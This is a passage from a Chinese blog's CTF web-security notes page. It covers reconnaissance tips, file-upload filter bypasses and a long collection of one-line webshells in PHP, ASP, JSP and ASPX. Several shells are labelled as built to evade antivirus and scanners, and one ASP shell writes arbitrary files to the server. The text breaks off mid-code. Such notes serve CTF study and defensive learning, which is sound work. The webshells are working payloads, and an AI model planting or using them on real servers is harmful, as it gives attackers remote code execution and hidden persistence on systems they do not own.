<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>CTF之Web总结 | 矢幽武博客</title><meta name="author" content="矢幽武"><meta name="copyright" content="矢幽武"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="收集一切梭哈的笔记。 哪怕再怎么菜也得记住自己学到&#x2F;遇到过什么东西，才不枉费自己曾经的付出。 信息收集基本收集在搜索到phpinfo时，disable_functions出现的所有函数代表的是封禁函数，也就是内部配置的禁用函数。 ## 扫站扫站工具：    dirmap		扫目录扫文件，相似的有dirsearch。    dirsearch 	扫站工具    ...			&lt;其它待收集&gt;">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF之Web总结">
<meta property="og:url" content="http://example.com/2023/08/30/CTF-web-book-001/index.html">
<meta property="og:site_name" content="矢幽武博客">
<meta property="og:description" content="收集一切梭哈的笔记。 哪怕再怎么菜也得记住自己学到&#x2F;遇到过什么东西，才不枉费自己曾经的付出。 信息收集基本收集在搜索到phpinfo时，disable_functions出现的所有函数代表的是封禁函数，也就是内部配置的禁用函数。 ## 扫站扫站工具：    dirmap		扫目录扫文件，相似的有dirsearch。    dirsearch 	扫站工具    ...			&lt;其它待收集&gt;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/backgroude/b25.jpg">
<meta property="article:published_time" content="2023-08-30T03:19:08.000Z">
<meta property="article:modified_time" content="2024-02-09T15:19:51.220Z">
<meta property="article:author" content="矢幽武">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="web">
<meta property="article:tag" content="web-book">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/backgroude/b25.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2023/08/30/CTF-web-book-001/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF之Web总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-09 23:19:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">201</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">30</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroude/b25.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="矢幽武博客"><span class="site-name">矢幽武博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF之Web总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-30T03:19:08.000Z" title="发表于 2023-08-30 11:19:08">2023-08-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-09T15:19:51.220Z" title="更新于 2024-02-09 23:19:51">2024-02-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/">CTF赛题</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/%E7%9F%A5%E8%AF%86%E7%82%B9-web/">知识点-web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">28.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>122分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF之Web总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>收集一切梭哈的笔记。</p>
<p>哪怕再怎么菜也得记住自己学到/遇到过什么东西，才不枉费自己曾经的付出。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="基本收集"><a href="#基本收集" class="headerlink" title="基本收集"></a>基本收集</h2><p>在搜索到phpinfo时，disable_functions出现的所有函数代表的是封禁函数，也就是内部配置的禁用函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 扫站</span></span><br><span class="line">扫站工具：</span><br><span class="line">    dirmap		扫目录扫文件，相似的有dirsearch。</span><br><span class="line">    dirsearch 	扫站工具</span><br><span class="line">    ...			&lt;其它待收集&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">##子域名爆破</span></span><br><span class="line">https:<span class="comment">//chaziyu.com/ctf.show/</span></span><br><span class="line">    </span><br><span class="line">扫目录的目的：</span><br><span class="line">- 网站备份文件</span><br><span class="line">- 网站的源码泄露文件（.git,.svn,.swp, .bak等）</span><br><span class="line">- sql备份文件泄露（backup.sql，/db/db.mdb）</span><br><span class="line">- 说明文件：/robots.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">## 网站探针：</span></span><br><span class="line">    fofa，<span class="number">369</span>quake</span><br><span class="line"></span><br><span class="line"><span class="comment">## COOKIE伪造</span></span><br><span class="line">    形如：user=admin</span><br><span class="line"></span><br><span class="line"><span class="comment">## 框架判断</span></span><br><span class="line"><span class="number">1</span>. 数据包头中返回：    </span><br><span class="line">X-Powered-By: Express</span><br><span class="line">基本断定为js框架</span><br><span class="line"><span class="number">2</span>.根据浏览器插件进行判断</span><br><span class="line"></span><br><span class="line"><span class="comment">## 身份伪造：</span></span><br><span class="line">    伪造身份的时候，有时候不仅仅需要伪造用户名，还要伪造用户头像。</span><br><span class="line"></span><br><span class="line"><span class="comment">## 爆破</span></span><br><span class="line">    爆破随机数种子的工具：https:<span class="comment">//www.openwall.com/php_mt_seed/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 权限维持</span></span><br><span class="line">    某些网站需要Py脚本进行权限维持，保证权限不过期才能解答出答案。</span><br><span class="line">    Python当中用的时session</span><br><span class="line"></span><br><span class="line">模板漏洞    </span><br></pre></td></tr></table></figure>

<h2 id="nginx相关配置信息"><a href="#nginx相关配置信息" class="headerlink" title="nginx相关配置信息"></a>nginx相关配置信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx/			access.log</span><br><span class="line">	/var/log/nginx/access.log</span><br><span class="line">	</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<h2 id="关键文件后缀"><a href="#关键文件后缀" class="headerlink" title="关键文件后缀"></a>关键文件后缀</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.rar、.zip、.7z、.tar、.gz、.tar.gz、.bz2、.tar.bz2、.sql、.bak、.dat、.txt、.<span class="built_in">log</span>、.mdb</span><br></pre></td></tr></table></figure>





<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="上传木马php-拿下后台"><a href="#上传木马php-拿下后台" class="headerlink" title="上传木马php,拿下后台"></a>上传木马php,拿下后台</h2><p>注意事项</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改的方式有很多种，围绕着文件内容，主要是插入木马。</span></span><br><span class="line"><span class="number">1</span>.修改文件名</span><br><span class="line"><span class="number">2</span>.修改文件类型</span><br><span class="line"><span class="number">3</span>.修改上传的文件头为    GIF89a?</span><br><span class="line">	a.php/. 绕过php黑名单限制</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 一般情况下，木马都是以xx.php的形式存在的。</span></span><br><span class="line">    <span class="comment"># php木马在非解析漏洞的前提下，必须使用php后缀</span></span><br><span class="line">    <span class="comment"># 收集了部分后缀</span></span><br><span class="line">    phtml <span class="title function_ invoke__">php</span>		(普通情况下) </span><br><span class="line">    php5 php6 <span class="title function_ invoke__">php7</span>  (带版本)</span><br><span class="line">    <span class="title function_ invoke__">Php</span>				(大小写)</span><br><span class="line"><span class="comment"># 某些情况下，php可以使用phtml</span></span><br></pre></td></tr></table></figure>

<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`cat /f*`<span class="meta">?&gt;</span> <span class="comment"># 超级简短的一句话</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#--------------------</span></span><br><span class="line"><span class="comment"># 来源 https://www.cnblogs.com/u0mo5/p/4901037.html</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>)%&gt; </span><br><span class="line">&lt;%execute <span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>)%&gt; </span><br><span class="line">&lt;%<span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>))%&gt; </span><br><span class="line">&lt;%ExecuteGlobal <span class="title function_ invoke__">request</span>(<span class="string">&quot;sb&quot;</span>)%&gt; </span><br><span class="line">%&gt;&lt;%<span class="title function_ invoke__">Eval</span>(<span class="title function_ invoke__">Request</span>(<span class="title function_ invoke__">chr</span>(<span class="number">35</span>)))%&gt;&lt;% </span><br><span class="line">&lt;%<span class="keyword">if</span> <span class="title function_ invoke__">request</span> (<span class="string">&quot;c&quot;</span>)&lt;&gt;<span class="string">&quot;&quot;</span>then <span class="title function_ invoke__">session</span>(<span class="string">&quot;c&quot;</span>)=<span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>):end <span class="keyword">if</span>:<span class="keyword">if</span> <span class="title function_ invoke__">session</span>(<span class="string">&quot;c&quot;</span>)&lt;&gt;<span class="string">&quot;&quot;</span> then execute <span class="title function_ invoke__">session</span>(<span class="string">&quot;c&quot;</span>)%&gt; </span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;c&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt; </span><br><span class="line"><span class="string">&#x27;备份专用 </span></span><br><span class="line"><span class="string">&lt;%eval(request(&quot;c&quot;)):response.end%&gt; </span></span><br><span class="line"><span class="string">&#x27;</span>无防下载表,有防下载表突破专用一句话 </span><br><span class="line">&lt;%execute <span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>)%&gt;&lt;%&lt;%loop&lt;%:%&gt; </span><br><span class="line">&lt;%&lt;%loop&lt;%:%&gt;&lt;%execute <span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>)%&gt; </span><br><span class="line">&lt;%execute <span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>)&lt;%loop&lt;%:%&gt; </span><br><span class="line"><span class="string">&#x27;防杀防扫专用 </span></span><br><span class="line"><span class="string">&lt;%if Request(&quot;c&quot;)&lt;&gt;&quot;&quot; ThenExecuteGlobal(Request(&quot;c&quot;))%&gt; </span></span><br><span class="line"><span class="string">&#x27;</span>不用<span class="string">&quot;&lt;,&gt;&quot;</span> </span><br><span class="line">&lt;script language=VBScript runat=server&gt;execute <span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>)&lt;/script&gt; </span><br><span class="line">&lt;% @Language=<span class="string">&quot;JavaScript&quot;</span> CodePage=<span class="string">&quot;65001&quot;</span><span class="keyword">var</span> lcx=&#123;<span class="string">&#x27;名字&#x27;</span>:Request.<span class="title function_ invoke__">form</span>(<span class="string">&#x27;#&#x27;</span>),<span class="string">&#x27;性别&#x27;</span>:<span class="keyword">eval</span>,<span class="string">&#x27;年龄&#x27;</span>:<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;昵称&#x27;</span>:<span class="string">&#x27;请叫我一声老大&#x27;</span>&#125;;lcx.性别((lcx. </span><br><span class="line">名字)+<span class="string">&#x27;&#x27;</span>) %&gt; </span><br><span class="line">&lt;script language=vbs runat=server&gt;<span class="keyword">eval</span>(<span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>))&lt;/script&gt; </span><br><span class="line">&lt;script language=vbs runat=server&gt;<span class="title function_ invoke__">eval_r</span>(<span class="title function_ invoke__">request</span>(<span class="string">&quot;c&quot;</span>))&lt;/script&gt; </span><br><span class="line"><span class="string">&#x27;不用双引号 </span></span><br><span class="line"><span class="string">&lt;%eval request(chr(35))%&gt; </span></span><br><span class="line"><span class="string">&#x27;</span>可以躲过雷客图 </span><br><span class="line">&lt;%set ms = server.<span class="title function_ invoke__">CreateObject</span>(<span class="string">&quot;MSScriptControl.ScriptControl.1&quot;</span>) ms.Language=<span class="string">&quot;VBScript&quot;</span> ms.AddObject<span class="string">&quot;response&quot;</span>,response ms.AddObject </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;request&quot;</span>,request ms.<span class="title function_ invoke__">ExecuteStatement</span>(<span class="string">&quot;ev&quot;</span>&amp;<span class="string">&quot;al(request(&quot;</span><span class="string">&quot;c&quot;</span><span class="string">&quot;))&quot;</span>)%&gt; </span><br><span class="line">&lt;%dy=<span class="title function_ invoke__">request</span>(<span class="string">&quot;dy&quot;</span>)%&gt;&lt;%<span class="title function_ invoke__">Eval</span>(dy)%&gt; </span><br><span class="line"><span class="string">&#x27;容错代码 </span></span><br><span class="line"><span class="string">if Request(&quot;sb&quot;)&lt;&gt;&quot;&quot; then ExecuteGlobal request(&quot;sb&quot;) end if </span></span><br><span class="line"><span class="string">PHP一句话 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">复制代码代码如下:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST1);?&gt; </span></span><br><span class="line"><span class="string">&lt;?php if(isset($_POST[&#x27;</span>c<span class="string">&#x27;]))&#123;eval($_POST[&#x27;</span>c<span class="string">&#x27;]);&#125;?&gt; </span></span><br><span class="line"><span class="string">&lt;?php system($_REQUEST1);?&gt; </span></span><br><span class="line"><span class="string">&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; </span></span><br><span class="line"><span class="string">&lt;?php eval_r($_POST1)?&gt; </span></span><br><span class="line"><span class="string">&lt;?php @eval_r($_POST1)?&gt;//容错代码 </span></span><br><span class="line"><span class="string">&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </span></span><br><span class="line"><span class="string">&lt;?$_POST[&#x27;</span>c<span class="string">&#x27;]($_POST[&#x27;</span>cc<span class="string">&#x27;]);?&gt; </span></span><br><span class="line"><span class="string">&lt;?$_POST[&#x27;</span>c<span class="string">&#x27;]($_POST[&#x27;</span>cc<span class="string">&#x27;],$_POST[&#x27;</span>cc<span class="string">&#x27;])?&gt; </span></span><br><span class="line"><span class="string">&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#x27;</span>h<span class="string">&#x27;],&quot;error&quot;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; </span></span><br><span class="line"><span class="string">&lt;?php echo `$_GET[&#x27;</span>r<span class="string">&#x27;]` ?&gt; </span></span><br><span class="line"><span class="string">//绕过&lt;?限制的一句话 </span></span><br><span class="line"><span class="string">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">JSP一句话 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">复制代码代码如下:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; </span></span><br><span class="line"><span class="string">提交客户端 </span></span><br><span class="line"><span class="string">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt; </span></span><br><span class="line"><span class="string">ASPX一句话 </span></span><br><span class="line"><span class="string">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">再补充几个：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">推荐还是把一句话加进图片里面去。 </span></span><br><span class="line"><span class="string">普通的php一句话：&lt;?php @eval($_POST[&#x27;</span>r00ts<span class="string">&#x27;]);?&gt; </span></span><br><span class="line"><span class="string">普通的asp一句话：&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt; </span></span><br><span class="line"><span class="string">aspx突破一流的： </span></span><br><span class="line"><span class="string">[code] </span></span><br><span class="line"><span class="string">dim da </span></span><br><span class="line"><span class="string">set fso=server.createobject(&quot;scripting.filesystemobject&quot;) </span></span><br><span class="line"><span class="string">path=request(&quot;path&quot;) </span></span><br><span class="line"><span class="string">if path&lt;&gt;&quot;&quot; then </span></span><br><span class="line"><span class="string">data=request(&quot;da&quot;) </span></span><br><span class="line"><span class="string">set da=fso.createtextfile(path,true) </span></span><br><span class="line"><span class="string">da.write data </span></span><br><span class="line"><span class="string">if err=0 then </span></span><br><span class="line"><span class="string">Response.Write &quot;yes&quot; </span></span><br><span class="line"><span class="string">else </span></span><br><span class="line"><span class="string">Response.Write &quot;no&quot; </span></span><br><span class="line"><span class="string">end if </span></span><br><span class="line"><span class="string">err.clear </span></span><br><span class="line"><span class="string">end if </span></span><br><span class="line"><span class="string">set da=nothing </span></span><br><span class="line"><span class="string">set fos=nothing </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;form action=&quot; method=post&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;input type=text name=path&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;br&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;当前文件路径:&quot;&amp;server.mappath(request.servervariables(&quot;script_name&quot;)) </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;br&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;操作系统为:&quot;&amp;Request.ServerVariables(&quot;OS&quot;) </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;br&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;WEB服务器版本为:&quot;&amp;Request.ServerVariables(&quot;SERVER_SOFTWARE&quot;) </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;br&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write &quot;&lt;textarea name=da cols=50 rows=10 width=30&gt;&lt;/textarea&gt;&quot; </span></span><br><span class="line"><span class="string">Response.Write 